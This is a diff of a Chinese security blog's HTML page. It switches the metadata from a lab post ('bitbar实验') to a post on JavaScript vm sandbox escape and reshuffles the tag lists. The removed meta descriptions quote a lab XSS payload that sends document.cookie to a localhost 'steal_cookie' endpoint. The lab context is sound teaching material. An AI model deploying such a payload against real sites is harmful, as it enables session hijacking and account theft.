@@ -6,23 +6,21 @@
   <meta name="keywords" content=" 隐写 ">
   <meta name="description" content="如何保护版权 | prontosil&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="Attack  1: Warm-up exercise: Cookie Theftpayload &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;(new Image()).src&#x3D;&quot;http:&#x2F;&#x2F;localhost:3000&#x2F;steal_cookie?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;">
+<meta name="description" content="vm沙箱逃逸&quot;use strict&quot;; const vm &#x3D; require(&quot;vm&quot;); const xyz &#x3D; vm.runInNewContext(&#96;let a &#x3D; &quot;welcome!&quot;;a;&#96;); console.log(xyz); 打印出 welcome如果换成 &quot;use strict&quot;; const vm">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bitbar实验">
-<meta property="og:url" content="http://prontosil.com/posts/bc703cb4/index.html">
+<meta property="og:title" content="js沙箱逃逸">
+<meta property="og:url" content="http://prontosil.com/posts/55470809/index.html">
 <meta property="og:site_name" content="prontosil&#39;s Blog">
-<meta property="og:description" content="Attack  1: Warm-up exercise: Cookie Theftpayload &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;(new Image()).src&#x3D;&quot;http:&#x2F;&#x2F;localhost:3000&#x2F;steal_cookie?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;">
+<meta property="og:description" content="vm沙箱逃逸&quot;use strict&quot;; const vm &#x3D; require(&quot;vm&quot;); const xyz &#x3D; vm.runInNewContext(&#96;let a &#x3D; &quot;welcome!&quot;;a;&#96;); console.log(xyz); 打印出 welcome如果换成 &quot;use strict&quot;; const vm">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://prontosil.com/posts/bc703cb4/1588517915811.png">
-<meta property="og:image" content="http://prontosil.com/posts/bc703cb4/931ecdae-5601-4395-bc2c-d1e49b2ba8e6.png!large">
-<meta property="og:image" content="http://prontosil.com/posts/bc703cb4/1588571397765.png">
-<meta property="og:image" content="http://prontosil.com/posts/bc703cb4/1588573100136.png">
-<meta property="article:published_time" content="2020-05-03T14:50:23.000Z">
-<meta property="article:modified_time" content="2020-05-04T07:06:25.440Z">
+<meta property="og:image" content="http://prontosil.com/posts/55470809/1589114675198.png">
+<meta property="og:image" content="http://prontosil.com/posts/55470809/1589114918266.png">
+<meta property="article:published_time" content="2020-05-10T12:34:59.000Z">
+<meta property="article:modified_time" content="2020-05-10T12:58:18.179Z">
 <meta property="article:author" content="prontosil">
-<meta property="article:tag" content="实验">
+<meta property="article:tag" content="js">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://prontosil.com/posts/bc703cb4/1588517915811.png">
+<meta name="twitter:image" content="http://prontosil.com/posts/55470809/1589114675198.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -150,7 +148,7 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(84)</small></div></li>
+    <li><div class="all active">全部文章<small>(85)</small></div></li>
     
         
             
@@ -162,15 +160,7 @@
     
         
             
-            <li><div data-rel="CTF">CTF<small>(24)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
-            <li><div data-rel="编程">编程<small>(25)</small></div>
+            <li><div data-rel="CTF">CTF<small>(25)</small></div>
                 
             </li>
             
@@ -179,6 +169,14 @@
         
             
             <li><div data-rel="代码审计">代码审计<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="编程">编程<small>(25)</small></div>
                 
             </li>
             
@@ -210,8 +208,8 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="84">
-<input type="hidden" id="yelog_site_word_count" value="61k">
+<input type="hidden" id="yelog_site_posts_number" value="85">
+<input type="hidden" id="yelog_site_word_count" value="61.5k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -257,14 +255,6 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
-        <a class="color5">CSRF</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color4">POP</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">HTB</a>
     </li>
     
@@ -273,7 +263,23 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color5">CSRF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">POP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">jndi</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">应急响应</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -285,11 +291,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">jndi</a>
+        <a class="color3">实验</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">应急响应</a>
+        <a class="color4">XSS</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -301,31 +307,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">XSS</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color2">apache</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">实验</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">go</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color2">docker</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color4">php</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">函数</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -337,19 +319,27 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">jwt</a>
+        <a class="color1">SQL注入</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">go</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">js</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">函数</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color2">pickle</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color4">字符串</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color1">bytes</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -361,7 +351,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">KMP</a>
+        <a class="color2">apache</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">jwt</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -369,15 +363,11 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color4">KMP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color4">SQL</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color4">thinkphp</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">文件上传</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -386,6 +376,22 @@
     
     <li class="article-tag-list-item">
         <a class="color4">数据库</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">字符串</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">bytes</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">thinkphp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">文件上传</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -401,11 +407,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">cms</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color4">CTF</a>
+        <a class="color3">内网</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -413,15 +415,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color1">SQL注入</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">隐写</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">内网</a>
+        <a class="color4">CTF</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -429,11 +423,19 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">js</a>
+        <a class="color3">域名</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">webshell</a>
+        <a class="color5">命令执行</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">cms</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">隐写</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -441,23 +443,15 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">AWD</a>
+        <a class="color4">webshell</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">总结</a>
+        <a class="color4">dig</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color5">kill</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">面经</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color4">leetcode</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -469,10 +463,6 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">dig</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">xxd</a>
     </li>
     
@@ -481,15 +471,27 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color4">AWD</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">总结</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">面经</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">leetcode</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color3">汇编</a>
     </li>
     
     <li class="article-tag-list-item">
         <a class="color2">dosbox</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">域名</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -506,10 +508,6 @@
     
     <li class="article-tag-list-item">
         <a class="color3">截断</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">命令执行</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -536,6 +534,14 @@
            data-author="" >
             <span class="post-title" title="常用的网站">常用的网站</span>
             <span class="post-date" title="2020-03-10 13:30:08">2020/03/10</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/posts/55470809/"
+           data-tag="js"
+           data-author="" >
+            <span class="post-title" title="js沙箱逃逸">js沙箱逃逸</span>
+            <span class="post-date" title="2020-05-10 20:34:59">2020/05/10</span>
         </a>
         
         <a  class="CTF "
@@ -1376,7 +1382,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#CSRF','#POP','#HTB','#靶机','#Linux','#JavaScript','#原型链污染','#jndi','#应急响应','#xxe','#xml','#XSS','#apache','#实验','#go','#docker','#php','#函数','#java','#反序列化','#jwt','#pickle','#字符串','#bytes','#python','#Qt','#KMP','#文档','#SQL','#thinkphp','#文件上传','#sqlit','#数据库','#vscode','#xdebug','#vulnhub','#cms','#CTF','#游戏','#SQL注入','#隐写','#内网','#网站','#js','#webshell','#比赛','#AWD','#总结','#kill','#面经','#leetcode','#tcpdump','#提权','#dig','#xxd','#hexdump','#汇编','#dosbox','#域名','#Apache','#RCE','#SSI','#截断','#命令执行','#CSP','#ctf',],
+            'data': ['#HTB','#靶机','#CSRF','#POP','#jndi','#Linux','#应急响应','#JavaScript','#原型链污染','#实验','#XSS','#xxe','#xml','#docker','#java','#反序列化','#SQL注入','#go','#js','#php','#函数','#pickle','#python','#Qt','#apache','#jwt','#文档','#KMP','#SQL','#sqlit','#数据库','#字符串','#bytes','#thinkphp','#文件上传','#vscode','#xdebug','#vulnhub','#内网','#游戏','#CTF','#网站','#域名','#命令执行','#cms','#隐写','#比赛','#webshell','#dig','#kill','#tcpdump','#提权','#xxd','#hexdump','#AWD','#总结','#面经','#leetcode','#汇编','#dosbox','#Apache','#RCE','#SSI','#截断','#CSP','#ctf',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
